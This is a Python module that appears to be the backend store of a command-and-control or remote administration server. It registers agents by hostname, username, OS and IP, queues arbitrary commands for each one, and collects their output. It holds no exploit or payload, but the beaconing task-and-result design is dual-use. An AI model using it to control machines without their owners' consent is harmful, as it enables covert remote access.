import threading
import uuid
from datetime import datetime
from server.models import Agent, Task, Result

_lock = threading.Lock()
_agents: dict[str, Agent] = {}
_tasks: dict[str, list[Task]] = {}
_results: list[Result] = []

def register_or_update_agent(
        agent_id: str, 
        hostname: str, 
        username: str,
        os: str, 
        ip: str
) -> Agent: 
    with _lock: 
        if agent_id in _agents: 
            _agents[agent_id].last_seen =  datetime.now()
            return _agents[agent_id]
        
        agent = Agent(
            id=agent_id, 
            hostname=hostname,
            username=username, 
            os=os, 
            ip=ip, 
            first_seen=datetime.now(),
            last_seen=datetime.now(),         
        )
        _agents[agent_id] = agent
        _tasks.setdefault(agent_id, [])
        
        return agent
    
def list_agents() -> list[Agent]: 
    with _lock: 
        return list(_agents.values())
    
def queue_task(agent_id: str, command: str) -> Task: 
    with _lock: 
        if agent_id not in _agents: 
            raise KeyError(f"Unknown agent: {agent_id}")

        task = Task(
            id=str(uuid.uuid4()),
            agent_id=agent_id, 
            command=command, 
            created_at=datetime.now()
        )
        _tasks[agent_id].append(task)
        return task 
    
def get_pending_tasks(agent_id: str) -> list[Task]:
    with _lock: 
        agent_tasks = [t for t in _tasks.get(agent_id, []) if t.status == "pending"]
        
        for t in agent_tasks:
            t.status = "sent"

        return agent_tasks
    
def submit_result(
        task_id: str, 
        agent_id: str, 
        output: str
) -> Result: 
    with _lock: 
        result = Result(
            task_id=task_id, 
            agent_id=agent_id, 
            output=output, 
            received_at=datetime.now(),
        )
        _results.append(result)

        for task in _tasks.get(agent_id, []): 
            if task.id == task_id:
                task.status = "completed"
                break
        
        return result 

def get_results(agent_id: str) -> list[Result]: 
    with _lock: 
        return [r for r in _results if r.agent_id == agent_id]
    

